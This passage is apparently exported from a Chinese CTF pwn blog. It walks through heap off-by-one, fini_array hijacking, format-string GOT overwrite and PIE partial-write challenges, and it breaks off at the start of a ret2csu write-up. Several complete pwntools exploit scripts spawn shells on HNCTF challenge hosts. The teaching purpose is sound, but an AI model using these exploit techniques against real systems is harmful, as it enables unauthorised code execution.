<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4f302</span></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]+libc_addr </span><br></pre></td></tr></table></figure><p>此时我们再次申请一个大小为0x68的chunk 你会发现 这个chunk的指针和我们之前申请的chunk2是共享的</p><p>所以我们可以先free chunk2 再编辑chunk11的内容  此时你会发现我们编辑进chunk11的内容会被串连到bin链上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(11,0x68)</span><br><span class="line">free(2)</span><br><span class="line">edit(11,p64(free_hook))</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/xHbqts"><a href="https://s1.ax1x.com/2022/11/02/xHbqts.png" title="xHbqts.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/02/xHbqts.png" alt="xHbqts.png"></a></a></p><p>此时我们再申请一个chunk 就会取出bin中第一个chunk  再取出一个 就会获得指向free_hook的chunk</p><p>此时我们编辑该chunk的内容 就相当于像free_hook中写入任意</p><p>最终exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> lseek</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./null&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./null&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0xd0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">10</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">main_arean = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = main_arean -(<span class="number">0x7f91b42a5d70</span>-<span class="number">0x7f91b3eba000</span>)</span><br><span class="line">system_addr  = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr   = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4f302</span></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]+libc_addr </span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">13</span>,p64(onegadget_addr))</span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fini劫持</title>
      <link href="/2022/10/12/fini%E5%8A%AB%E6%8C%81/"/>
      <url>/2022/10/12/fini%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/1.png" title="1" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/1.png" alt="1"></a></p><p>一个程序在执行的时候 其并不是直接执行main函数</p><p>先是执行入口函数</p><p>入口函数对运行库和程序运行环境进行初始化，包括堆、I&#x2F;O、线程、全局变量的构造等等</p><p>在完成初始化之后，调用main函数，正式开始执行函数主体部分</p><p>main函数执行完毕之后，返回到入口函数，入口函数进行清理工作，包括全局变量析构、堆销毁、关闭I&#x2F;O等，然后进行系统调用结束进程</p><p>这里不具体到各个入口函数的区别 因为属于概念问题 理解起来不会有难度 可以自行查阅wiki</p><p>总之 如果只是为了做题而记忆 可以按下面理解</p><h3 id="在静态编译下"><a href="#在静态编译下" class="headerlink" title="在静态编译下"></a>在静态编译下</h3><p>bss段中会存放一个fini数组</p><p>在main函数结束后</p><p>程序指向了fini函数</p><p>其会先跳转到fini[1]存放的地址</p><p>接着返回fini[0]存放的地址</p><p>所以我们只需要将fini[1]修改为我们想要控制执行流的地方 再把fini[0]修改成fini函数</p><p>程序就会陷入死循环 重复的执行fini[1]指向的地址</p><h3 id="动态编译下"><a href="#动态编译下" class="headerlink" title="动态编译下"></a>动态编译下</h3><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/2.png" title="2" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/2.png" alt="2"></a></p><p>fini数组不会存储在bss段中 并且也只有一个字长</p><p>(不知道是不是我遇到的这题的特殊情况)</p><p>直接将这个地址的值覆盖成要重复执行的函数地址就行了</p><p>不过在我遇到的这题中好像就只能跳转一次 不能理论无限执行</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串任意写&amp;泄露基址</title>
      <link href="/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/"/>
      <url>/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>本篇主要讲述两个知识点： 格式化字符串任意写和泄露基址</p><p>我们在最初的格式化字符串漏洞学习中 已经掌握了查看偏移和篡改地址的数据的能力</p><p>但是如果是篡改puts函数的got表呢？</p><p>我们知道 动态链接的情况下 当我们调用一个函数时</p><p>他会寻址其got表内存储的真实地址(即对应函数在libc文件中的地址) 从而成功调用</p><p>如果我们将其got表内存储的真实地址修改为其他函数的真实地址</p><p>那么当程序调用原函数时 就相当于调用了篡改后的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmtstr_payload(offset, &#123;puts_got:system_addr &#125;)</span><br></pre></td></tr></table></figure><p>以上述payload为例 假设我们需要修改puts函数的got表 使其为system函数的地址</p><p>那么我们就可以这样构造payload(这里注意一下，fmtstr这个工具是会自己补齐字长的 这将影响到我们下文中一道例题 现在留个意就行了)</p><p>ps:并且这个工具默认生成的是32位情况下 如果需要切换到64位 需要自己手动添加</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">context.arch = &quot;amd64&quot;</span><br></pre></td></tr></table></figure><p>但是一般题目除非出题人好心 不然真实地址还是得我们自己泄露的吧</p><p>那如何一并利用格式化字符串泄露函数的真实地址呢？</p><p>还记不记得 格式化字符串最开始的漏洞利用 就是泄露栈上的内容 如果我们将got表写入栈上 那是不是也可以通过格式化字符串漏洞将其泄露出来？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%n$s&quot;</span>.ljust(<span class="number">16</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(puts_got)</span><br></pre></td></tr></table></figure><p>这里有几点要注意一下 一个是n 注意是地址所在的偏移</p><p>还有一点是格式化字符这里选择的是s </p><p>最后一个疑惑在于为什么要用\x00补齐16个字节 这个我也不懂 死记就完事了(你也可以试试不补齐 然后看会泄露个啥出来)</p><p>好了 接下来用一题例题来演示一下 方便理解(例题还涉及到了fini劫持的知识点 不懂的话建议先去看另外一篇)</p><h2 id="HNCTF2022-WEEK2-fmtstr-level2"><a href="#HNCTF2022-WEEK2-fmtstr-level2" class="headerlink" title="HNCTF2022-[WEEK2]fmtstr_level2"></a>HNCTF2022-[WEEK2]fmtstr_level2</h2><p>附件有给libc文件 猜测要用到泄露基址</p><p>checksec看一下进制和保护</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022252144.png" title="1" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022252144.png" alt="1"></a></p><p>有canary 要么泄露绕过 要么就不能栈溢出了</p><p>再看一下程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">296</span>]; <span class="comment">// [rsp+0h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the game of formatting strings&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Be careful, you only get one shot at this game&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;First please tell me your game ID&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Okk,try to hack it;sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>唯一看起来有价值的就只有main函数了 没有任何的后门函数 甚至buf的字节也不够栈溢出</p><p>但是注意看 最后的puts输出的字符串有sh</p><p>那么可以猜测出题目的解法是修改got表</p><p>结果我们只有一次格式化字符串任意写的机会 好像并不能满足泄露地址后再修改got表的需求</p><p>但是如果我们将fini_array的值改为main函数 那么程序结束后 就会重新返回到main函数 那么我们就有了第二次利用格式化字符串的机会</p><p>于是解题思路可以分为两步</p><p>1.修改fini_array和泄露函数真实地址</p><p>2.将puts_got修改为system函数</p><p>那么接下来开始编写exp</p><p>gdb查看了偏移以后 发现我们输入的第一个字长的数据位于偏移6的地方</p><p>第一个payload的难点在于搞清楚两个格式化字符串的偏移和payload的结构</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;fini_addr:main_addr&#125;)</span><br><span class="line">payload += <span class="string">b&quot;%17$s&quot;</span>.ljust(<span class="number">16</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(puts_got)  //<span class="number">6</span>+<span class="number">8</span>（第一行payload字节数<span class="number">64</span>）+<span class="number">2</span>+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>按照我们上文所说的是不是应该这么构造payload 但是你会发现最后泄露出来的地址是</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022301648.png" title="2" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022301648.png" alt="2"></a></p><p>aaaaba+fini_array的地址(0x4031f0)</p><p>前面的aaaaba是什么东西？</p><p>我们打印出fmtstr构造的数据看看</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022253431.png" title="3" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022253431.png" alt="3"></a></p><p>可以看到aaaaba出自这里 这里就是我们上文所说到的fmtstr的自动补齐一个字长</p><p>而后面的\x00也是为了传送地址(但是地址只有三字节 所以需要5个\x00才补齐一个字长)</p><p>那么说回我们刚才的错误 其原因在于我们需要将格式化字符串放在一起 地址放在一起</p><p>才能两次利用一个漏洞点</p><p>所以 正确的payload应该把aaaaba替换成泄露地址的格式化字符串</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\xf01@\x00\x00\x00\x00\x00\xf11@\x00\x00\x00\x00\x00\xf21@\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(puts_got)</span><br></pre></td></tr></table></figure><p>但是这里我们会发现 recv接收到的数据太多了 像ret2libc中的接收办法显然是会出错的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure><p>这里用到[-6:]   只接收后六个字节</p><p>那么我们此时成功进行了fini劫持 我们再输入io.recv()就会发现又接收到了main函数开始时puts的那些字符串</p><p>第二次的payload就简单至极了 最后放下完整的exp吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28466</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;First please tell me your game ID&quot;</span>)</span><br><span class="line">fini_addr = <span class="number">0x4031F0</span></span><br><span class="line">main_addr = <span class="number">0x4011b6</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\xf01@\x00\x00\x00\x00\x00\xf11@\x00\x00\x00\x00\x00\xf21@\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">hex</span>(libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io.recv()</span><br><span class="line">io.recvuntil(<span class="string">&quot;First please tell me your game ID&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;puts_got:system_addr&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单爆破partial write</title>
      <link href="/2022/10/06/%E7%AE%80%E5%8D%95%E7%88%86%E7%A0%B4partial-write/"/>
      <url>/2022/10/06/%E7%AE%80%E5%8D%95%E7%88%86%E7%A0%B4partial-write/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>本篇介绍ret2text的一种特殊情况</p><p>先前我们学习过的是没有pie的情况下 这时候我们backdoor函数的地址清清楚楚</p><p>我们可以直接栈溢出覆盖 控制程序执行流 但是如果开了pie呢？</p><p>这样的话后门函数的地址就随机化了 我们通过ida只能得知其与基址的偏移</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006172634.png" title="QQ截图20221006172634" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006172634.png" alt="QQ截图20221006172634"></a></p><p>如上图所示 这样的情况下 我们又该如何得知backdoor函数的真实返回地址呢？</p><p>不知道你还记不记得我们曾经讲过虚拟内存分页机制</p><p>其导致了基址的后三位一定为000 所以函数的地址后三位保持不变 不会因为pie的开启而变化</p><p>所以：</p><p>我们假设程序的基址是0xfffffffffffff000</p><p>那么函数的偏移是0x0000 其除了后四位 其他位和基址是一样的(不排除进一的情况)</p><p>而程序正常结束后的ret 其地址也是基址+偏移得到的</p><p>所以，我们在已经直到后三位的情况下 要想得知后门函数的真实地址 只需要爆破倒数第四位 就可以试出来了</p><h2 id="真题解析"><a href="#真题解析" class="headerlink" title="真题解析"></a>真题解析</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006184438.png" title="QQ截图20221006184438" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006184438.png" alt="QQ截图20221006184438"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you konw ret2text?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s a easy challenge&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x140</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最简单的栈溢出到后门函数 唯一不同的是开启了pie需要爆破倒数第四位的地址</p><p>直接上exp吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    io = remote(<span class="string">&quot;43.143.7.97&quot;</span>,<span class="number">28774</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;It&#x27;s a easy challenge&quot;</span>)</span><br><span class="line">    payload = cyclic(<span class="number">0x100</span>+<span class="number">0x8</span>)</span><br><span class="line">    payload += p16(<span class="number">0x11e2</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">    result = io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    try_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exploit()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            try_count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failed :&#123;&#125;&quot;</span>.<span class="built_in">format</span>(try_count))</span><br></pre></td></tr></table></figure><p>这里你会发现后三位的地址有点不一样 后门函数的后三位是1DD 但是exp上写的是1e2</p><p>这里是栈对齐的问题 因为开启了pie 又没办法泄露基址 所以我们无法获得ret的汇编地址</p><p>这里看一下汇编代码 就比较好理解了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006185345.png" title="QQ截图20221006185345" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006185345.png" alt="QQ截图20221006185345"></a></p><p>我们相当于是跳过了push rbp这一指令 因为此时的rbp已经被我们填入的垃圾数据覆盖了 如果这时候将rbp入栈</p><p>就会破坏原有的栈结构 至于为什么在没有开启pie的ret2text的题目中不用注意这一点 只能解释说这是pie特有的需要注意的情况</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF2022.ret2csu</title>
      <link href="/2022/10/06/HNCTF2022-ret2csu/"/>
      <url>/2022/10/06/HNCTF2022-ret2csu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>看一下保护机制</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022301827.png" title="QQ截图20221006165446" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022301827.png" alt="QQ截图20221006165446"></a></p><p>再拖到ida里看一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Start Your Exploit!\n&quot;</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Ok.\n&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主体部分非常简洁 但是没有任何后门函数和泄露真实地址的地方</p><p>一开始我们会想自己构造rop链</p><p>通过ROPgadget来寻找rdi rsi rdx三个寄存器的传参汇编地址</p><p>我们来看一下能否找到我们想要的汇编</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006170927.png" title="QQ截图20221006170927" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006170927.png" alt="QQ截图20221006170927"></a></p><p>可以看到并没有rdx</p><p>但是仍然还存在一种可能，我们gdb看一下当我们read数据的时候 rdx寄存器的值是多少</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006171139.png" title="QQ截图20221006171139" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006171139.png" alt="QQ截图20221006171139"></a></p><p>可以看到是0x4 显然没有办法成为我们调用wirte函数的参数(因为其是作为第三个参数size存在的，这样我们只能输出4个字节的数据)</p><p>所以此时我们回忆一下，有没有什么万能的rop链？欸 一想还真有 叫ret2csu(相关的介绍在栈部分里有)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401290 loc_401290:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000401290                 mov     rdx, r14</span><br><span class="line">.text:0000000000401293                 mov     rsi, r13</span><br><span class="line">.text:0000000000401296                 mov     